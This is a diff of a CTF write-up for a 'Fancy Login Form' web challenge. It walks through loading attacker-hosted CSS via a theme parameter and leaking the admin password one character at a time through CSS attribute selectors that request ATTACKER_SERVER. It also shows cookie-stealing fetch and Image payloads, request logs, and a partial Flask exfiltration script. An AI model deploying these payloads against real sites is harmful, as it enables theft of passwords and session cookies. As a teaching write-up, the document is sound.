@@ -18,6 +18,10 @@ layout:
 
 # Fancy Login Form
 
+## Video Walkthrough
+
+[![](https://img.youtube.com/vi/jUjlj2z5jJk/0.jpg)](https://www.youtube.com/watch?v=jUjlj2z5jJk "Fancy Login Form (What Hackers Yearn CTF)")
+
 ## Description
 
 > We created a [login form](https://fancy-login-form.ctf.zone) with different themes, hope you like it!
@@ -37,14 +41,17 @@ There's a button to dynamically change the theme, which updates a CSS path but d
 Checking the HTTP history in burp suite, there is a POST request to `/report.php` with the following parameter:
 
 {% code overflow="wrap" %}
+
 ```
 url=https://fancy-login-form.ctf.zone/?theme=css/ocean
 ```
+
 {% endcode %}
 
 We can also see the JS code responsible for issuing the request.
 
 {% code overflow="wrap" %}
+
 ```javascript
 document.getElementById("report").addEventListener("click", (e) => {
     var url = window.location.href;
@@ -58,6 +65,7 @@ document.getElementById("report").addEventListener("click", (e) => {
     document.getElementById("report-text").textContent = "Report sent! An admin will visit the URL shortly!";
 });
 ```
+
 {% endcode %}
 
 ### Open Redirect
@@ -65,19 +73,23 @@ document.getElementById("report").addEventListener("click", (e) => {
 At first, I think of XSS and replace the `url` with my own server URL (ngrok), but don't get a hit. I remember the hint "The admin will only visit its OWN URL" and realise we also have an open redirect. We can supply the `theme` parameter of the URL our own domain.
 
 {% code overflow="wrap" %}
+
 ```
 url=https://fancy-login-form.ctf.zone/?theme=https://ATTACKER_SERVER/css/ocean
 ```
+
 {% endcode %}
 
 We get a hit for the `/css/ocean.css` file (meaning we don't control the file extension), so we can create that file on our server. Let's set the contents to import a background image.
 
 {% code overflow="wrap" %}
+
 ```css
 body {
     background-image: url("https://ATTACKER_SERVER?flag=meow");
 }
 ```
+
 {% endcode %}
 
 The server gets a hit!
@@ -87,28 +99,34 @@ The server gets a hit!
 Unfortunately, I tried various payloads to execute JS here, e.g.
 
 {% code overflow="wrap" %}
+
 ```css
 body {
     background-image: url("https://ATTACKER_SERVER?flag=" + document.cookie);
 }
 ```
+
 {% endcode %}
 
 These resulted in no request being made to the attacker server (not just a missing cookie). I also tried hosting an external JS file, e.g.
 
 {% code overflow="wrap" %}
+
 ```javascript
 var img = new Image();
 img.src = "https://ATTACKER_SERVER?flag=" + document.cookie;
 ```
+
 {% endcode %}
 
 Which we import via the attacker-controlled CSS.
 
 {% code overflow="wrap" %}
+
 ```css
 @import url("https://ATTACKER_SERVER/payload.js");
 ```
+
 {% endcode %}
 
 It successfully imports, but we don't get the `?flag` request.
@@ -118,6 +136,7 @@ It successfully imports, but we don't get the `?flag` request.
 I tried a variety of payloads/formats here but each had the same issue, e.g.
 
 {% code overflow="wrap" %}
+
 ```javascript
 fetch("https://ATTACKER_SERVER?flag=" + document.cookie, {
     method: "GET",
@@ -126,6 +145,7 @@ fetch("https://ATTACKER_SERVER?flag=" + document.cookie, {
     },
 });
 ```
+
 {% endcode %}
 
 I tested this a little in my own browser and spotted the following error.
@@ -135,6 +155,7 @@ I tested this a little in my own browser and spotted the following error.
 Still playing around in the browser devtools style editor, I try a different CSS payload.
 
 {% code overflow="wrap" %}
+
 ```css
 @font-face {
     font-family: "meow";
@@ -145,6 +166,7 @@ body {
     font-family: "meow";
 }
 ```
+
 {% endcode %}
 
 ![](images/5.PNG)
@@ -161,22 +183,26 @@ I investigated/tested some more techniques from these excellent resources:
 When reading the blogs, I noticed a method to exfiltrate data from form fields using CSS. I reviewed the source code again and realised there was some JS updating a password attribute each time a key was pressed.
 
 {% code overflow="wrap" %}
+
 ```javascript
 const inp = document.getElementById("password");
 inp.addEventListener("keyup", (e) => {
     inp.setAttribute("value", inp.value);
 });
 ```
+
 {% endcode %}
 
 The fact they only do this for the password, not the username, made me suspicious 🔎 I updated the CSS in the devtools style editor.
 
 {% code overflow="wrap" %}
+
 ```css
 input[name="password"][value^="a"] {
     background-image: url(https://ATTACKER_SERVER/a);
 }
 ```
+
 {% endcode %}
 
 When I typed "a" into the password field, I saw a request to the `/a` endpoint on my server.
@@ -186,6 +212,7 @@ When I typed "a" into the password field, I saw a request to the `/a` endpoint o
 So, we can host the following in our CSS file. It will check if the first character of the password field matches any character in the alphabet (or digits).
 
 {% code overflow="wrap" %}
+
 ```css
 input[name="password"][value^="a"] {
     background-image: url("https://ATTACKER_SERVER/a");
@@ -207,25 +234,30 @@ input[name="password"][value^="f"] {
 }
 /** Add the remaining input elements for a-zA-Z0-9**/
 ```
+
 {% endcode %}
 
 Then send the admin our CSS URL.
 
 {% code overflow="wrap" %}
+
 ```
 https://fancy-login-form.ctf.zone/?theme=https://ATTACKER_SERVER/css/ocean
 ```
+
 {% endcode %}
 
 In our HTTP log, we'll get the first character of the password ("F")!
 
 {% code overflow="wrap" %}
+
 ```bash
 HTTP Requests
 -------------
 21:06:37.376 BST GET /F                         404 File not found
 21:06:36.748 BST GET /css/ocean.css             200 OK
 ```
+
 {% endcode %}
 
 We just need to repeat this for each character. You could automate this into a nice script but I went for the manual approach (was super slow, don't recommend lol); use find/replace and replace `value^=` with `value^=F`. Repeat this until we get it all.
@@ -233,6 +265,7 @@ We just need to repeat this for each character. You could automate this into a n
 Note: I realised that the password has special chars, so after finding `F0x13foXtrOT`, I added some more elements to the CSS.
 
 {% code overflow="wrap" %}
+
 ```css
 input[name=password][value^=F0x13foXtrOT\!] { background-image: url('https://ATTACKER_SERVER/!'); }
 input[name=password][value^=F0x13foXtrOT\@] { background-image: url('https://ATTACKER_SERVER/@'); }
@@ -257,25 +290,31 @@ input[name=password][value^=F0x13foXtrOT\,] { background-image: url('https://ATT
 input[name=password][value^=F0x13foXtrOT\.] { background-image: url('https://ATTACKER_SERVER/.'); }
 input[name=password][value^=F0x13foXtrOT\/] { background-image: url('https://ATTACKER_SERVER//'); }
 ```
+
 {% endcode %}
 
 The full password is `F0x13foXtrOT&Elas7icBe4n5`, we can login with:
 
 {% code overflow="wrap" %}
+
 ```
 admin:F0x13foXtrOT&Elas7icBe4n5
 ```
+
 {% endcode %}
 
 {% code overflow="wrap" %}
+
 ```
 Welcome admin! You earned yourself a flag: flag{6b1f095e79699a79dc4a366c1131313e}
 ```
+
 {% endcode %}
 
 After submitting the flag, I decided to use ChatGPT to write an automated solve script. I should have done this at the start, to reduce manual effort/error 😆
 
 {% code overflow="wrap" %}
+
 ```python
 from flask import Flask, Response
 from urllib.parse import quote
@@ -375,9 +414,11 @@ if __name__ == "__main__":
     print("[*] serve CSS at", S['attacker'] + "/css/ocean.css")
     app.run(host=a.host, port=a.port, debug=False)
 ```
+
 {% endcode %}
 
 {% code overflow="wrap" %}
+
 ```bash
 sudo python exfil.py
 
@@ -401,6 +442,7 @@ Press CTRL+C to quit
 127.0.0.1 - - [12/Aug/2025 09:30:07] "GET /css/ocean.css HTTP/1.1" 200 -
 [+] F0x
 ```
+
 {% endcode %}
 
 ![](images/7.PNG)
